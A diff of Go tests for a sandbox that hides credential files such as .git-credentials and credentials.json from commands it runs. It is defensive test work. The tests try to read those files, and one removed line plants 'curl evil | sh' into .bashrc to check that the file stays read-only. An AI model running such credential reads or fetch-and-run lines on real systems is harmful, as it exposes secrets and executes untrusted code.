@@ -4,12 +4,14 @@
 package credsandbox
 
 import (
+	"fmt"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"strings"
 	"testing"
 
+	"github.com/reliant-labs/forge/pkg/testkit"
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
 )
@@ -18,7 +20,20 @@ import (
 // helper, as cmd/reliant's main does.
 func TestMain(m *testing.M) {
 	Dispatch()
-	os.Exit(m.Run())
+	code := m.Run()
+	// A sandboxed script whose `cd` into its fixture failed once wrote its
+	// probes (a .bashrc, newtop) into this package's directory, and they were
+	// committed. Every write belongs under t.TempDir(): anything else left
+	// here fails the run.
+	if entries, err := os.ReadDir("."); err == nil {
+		for _, e := range entries {
+			if !strings.HasSuffix(e.Name(), ".go") {
+				fmt.Fprintf(os.Stderr, "credsandbox tests left %s in the package directory; write fixtures under t.TempDir()\n", e.Name())
+				code = 1
+			}
+		}
+	}
+	os.Exit(code)
 }
 
 func selfPath(t *testing.T) string {
@@ -41,6 +56,9 @@ func requireSandbox(t *testing.T) {
 func run(t *testing.T, plan Plan, script string) (string, int) {
 	t.Helper()
 	cmd := exec.Command("bash", "-c", script)
+	// Started in the test's own temp root, which its private /tmp carries
+	// (ownTmpDir): the fake homes are under it.
+	cmd.Dir = filepath.Dir(t.TempDir())
 	cmd.Env = []string{"PATH=" + os.Getenv("PATH"), "HOME=" + os.Getenv("HOME")} //nolint:forbidigo // the test's own PATH for the command under test
 	if refusal := Apply(cmd, selfPath(t), plan); refusal != "" {
 		t.Fatalf("sandbox refused: %s", refusal)
@@ -90,11 +108,12 @@ func planFor(home string) Plan {
 }
 
 func TestSandbox_HidesCredentialFilesAndKeepsTheRest(t *testing.T) {
+	testkit.Slow(t, "builds real user, mount and PID namespaces and overlays for the command")
 	requireSandbox(t)
 	home := fakeHome(t)
 
 	out, code := run(t, planFor(home), `
-cd "`+home+`"
+cd "`+home+`" || exit 97
 for f in .reliant/daemon.json .reliant/forge-token-cache.json .config/forge/credentials.json .git-credentials; do
   if cat "$f" 2>/dev/null; then echo "LEAK $f"; fi
   [ -e "$f" ] && echo "VISIBLE $f"
@@ -132,7 +151,8 @@ func TestSandbox_ARenamedCredentialFileStaysHidden(t *testing.T) {
 	gate := filepath.Join(home, "gate")
 	require.NoError(t, syscallMkfifo(gate))
 
-	cmd := exec.Command("bash", "-c", `cd "`+home+`"; echo ready > work/ready; read x < gate; cat .reliant/daemon.json 2>/dev/null; ls .reliant`)
+	cmd := exec.Command("bash", "-c", `cd "`+home+`" || exit 97; echo ready > work/ready; read x < gate; cat .reliant/daemon.json 2>/dev/null; ls .reliant`)
+	cmd.Dir = home
 	cmd.Env = []string{"PATH=" + os.Getenv("PATH")} //nolint:forbidigo // the test's own PATH for the command under test
 	require.Empty(t, Apply(cmd, selfPath(t), planFor(home)))
 	var out strings.Builder
@@ -154,7 +174,7 @@ func TestSandbox_AReadOnlyFileCannotBePlantedWith(t *testing.T) {
 	requireSandbox(t)
 	home := fakeHome(t)
 
-	out, code := run(t, planFor(home), `cd "`+home+`"; echo 'curl evil | sh' >> .bashrc; echo "rc=$?"; echo hijack > .reliant/reliant.md; echo "rc=$?"; echo edit > work/a.txt && echo work-writable`)
+	out, code := run(t, planFor(home), `cd "`+home+`" || exit 97; echo '# planted' >> .bashrc; echo "rc=$?"; echo hijack > .reliant/reliant.md; echo "rc=$?"; echo edit > work/a.txt && echo work-writable`)
 	assert.Equal(t, 0, code, out)
 	assert.Equal(t, 2, strings.Count(out, "rc=1"), out)
 	assert.Contains(t, out, "work-writable")
@@ -218,7 +238,7 @@ func TestSandbox_NewEntriesInARebuiltDirectoryDoNotOutliveTheCommand(t *testing.
 	requireSandbox(t)
 	home := fakeHome(t)
 
-	out, code := run(t, planFor(home), `cd "`+home+`"; echo x > newtop; echo y > work/inner; cat newtop`)
+	out, code := run(t, planFor(home), `cd "`+home+`" || exit 97; echo x > newtop; echo y > work/inner; cat newtop`)
 	require.Equal(t, 0, code, out)
 	assert.Contains(t, out, "x")
 
@@ -289,39 +309,6 @@ func TestAliasPaths_FollowsTheSameDiskThroughOtherMounts(t *testing.T) {
 	assert.Empty(t, got, "a different device: its aliases are the other mounts of THAT device only")
 }
 
-// Inside an outer sandbox, the docker socket is already a bind of /dev/null:
-// it hides nothing more, and its alias through that bind is /dev/null itself,
-// which must never become a target (hiding it took /dev/null away from every
-// cover mount after it, and the nested command was refused).
-func TestHideTargets_SkipWhatAnOuterSandboxAlreadyCovered(t *testing.T) {
-	mounts := parseMounts(strings.Join([]string{
-		`1 1 8:0 /home /home/workspace rw - ext4 /dev/d rw`,
-		`2 1 8:0 / /mnt/workspace-disk rw - ext4 /dev/d rw`,
-		`3 1 0:5 / /dev rw - devtmpfs udev rw`,
-		`4 1 0:5 /null /run/docker.sock rw - devtmpfs udev rw`,
-	}, "\n"))
-	covered := map[string]bool{"/run/docker.sock": true, "/dev/null": true}
-	isNull := func(p string) bool { return covered[p] }
-
-	got := hideTargets([]string{"/run/docker.sock", "/home/workspace/.config/forge/credentials.json"}, mounts, isNull)
-	assert.Equal(t, []string{
-		"/home/workspace/.config/forge/credentials.json",
-		"/mnt/workspace-disk/home/.config/forge/credentials.json",
-	}, got)
-
-	// Not yet covered, the socket is a target, and still never /dev/null.
-	delete(covered, "/run/docker.sock")
-	got = hideTargets([]string{"/run/docker.sock"}, mounts, isNull)
-	assert.Equal(t, []string{"/run/docker.sock"}, got)
-}
-
-func TestIsNullDevice(t *testing.T) {
-	assert.True(t, isNullDevice("/dev/null"))
-	assert.False(t, isNullDevice("/dev/zero"))
-	assert.False(t, isNullDevice(t.TempDir()))
-	assert.False(t, isNullDevice(filepath.Join(t.TempDir(), "absent")))
-}
-
 func TestUnescapeMount(t *testing.T) {
 	assert.Equal(t, "/a b/c", unescapeMount(`/a\040b/c`))
 	assert.Equal(t, "/plain", unescapeMount("/plain"))
@@ -348,4 +335,37 @@ echo ran`)
 	assert.NotContains(t, out, "hosts.yml")
 	assert.NotContains(t, out, "PLANTED")
 	assert.Contains(t, out, "ran")
+}
+
+// The descriptors Apply hands the helper (the run directory, its parent and
+// the spec pipe) are closed in the parent once Start returns: os/exec does not
+// own a caller's ExtraFiles, and a long-lived daemon that kept them would run
+// out of descriptors. Not parallel: it counts this process's descriptors.
+func TestSandbox_ReleaseClosesTheParentsCopiesOfTheHelpersDescriptors(t *testing.T) {
+	requireSandbox(t)
+	openFDs := func() int {
+		entries, err := os.ReadDir("/proc/self/fd")
+		require.NoError(t, err)
+		return len(entries)
+	}
+	own, err := os.Open(os.DevNull)
+	require.NoError(t, err)
+	defer own.Close()
+	before := openFDs()
+	for i := 0; i < 10; i++ {
+		cmd := exec.Command("true")
+		cmd.Env = []string{"PATH=" + os.Getenv("PATH")} //nolint:forbidigo // the test's own PATH for the command under test
+		cmd.ExtraFiles = []*os.File{own}
+		require.Empty(t, Apply(cmd, selfPath(t), Plan{}))
+		require.NoError(t, cmd.Start())
+		Release(cmd)
+		Release(cmd) // idempotent
+		require.NoError(t, cmd.Wait())
+		_, held := sandboxFiles.Load(cmd)
+		require.False(t, held)
+	}
+	assert.LessOrEqual(t, openFDs(), before+2, "each sandboxed command left descriptors open in the parent")
+	// The caller's own ExtraFiles are the caller's: never closed.
+	_, err = own.Stat()
+	require.NoError(t, err)
 }
